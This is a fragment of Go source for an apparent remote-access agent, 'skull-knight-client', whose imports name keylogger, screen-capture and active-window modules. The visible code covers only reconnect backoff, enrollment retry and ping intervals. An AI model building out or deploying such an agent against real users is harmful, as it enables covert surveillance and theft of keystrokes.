...
import (
	...
	"skull-knight-client/cmd/agent/activewindow"
	"skull-knight-client/cmd/agent/capture"
	"skull-knight-client/cmd/agent/config"
	"skull-knight-client/cmd/agent/handlers"
	"skull-knight-client/cmd/agent/keylogger"
	"skull-knight-client/cmd/agent/plugins"
	rt "skull-knight-client/cmd/agent/runtime"
	"skull-knight-client/cmd/agent/sysinfo"
...
func computeBaseBackoff() time.Duration {
	mode := strings.ToLower(strings.TrimSpace(os.Getenv("SKULL_KNIGHT_MODE")))
	_ = mode
	return randomReconnectDelay(10*time.Second, 30*time.Second)
}

func reconnectDelay() time.Duration {
	raw := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_RECONNECT_DELAY_MS"))
	if raw == "" {
		return randomReconnectDelay(10*time.Second, 30*time.Second)
	}
	ms, err := strconv.Atoi(raw)
	if err != nil || ms < 0 {
		log.Printf("[reconnect] invalid SKULL_KNIGHT_RECONNECT_DELAY_MS=%q, using 10-30s", raw)
		return randomReconnectDelay(10*time.Second, 30*time.Second)
	}
	if ms == 0 {
		return 0
...
func getEnrollmentRetryInterval() time.Duration {
	raw := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_ENROLLMENT_RETRY_MS"))
	if raw != "" {
...
func getPingInterval() time.Duration {
	raw := strings.TrimSpace(os.Getenv("SKULL_KNIGHT_PING_INTERVAL_MS"))
	if raw == "" {
		return 30 * time.Second
	}
	ms, err := strconv.Atoi(raw)
	if err != nil {
		log.Printf("[ping] invalid SKULL_KNIGHT_PING_INTERVAL_MS=%q, using 30000ms", raw)
		return 30 * time.Second
	}
	if ms <= 0 {
		return 0
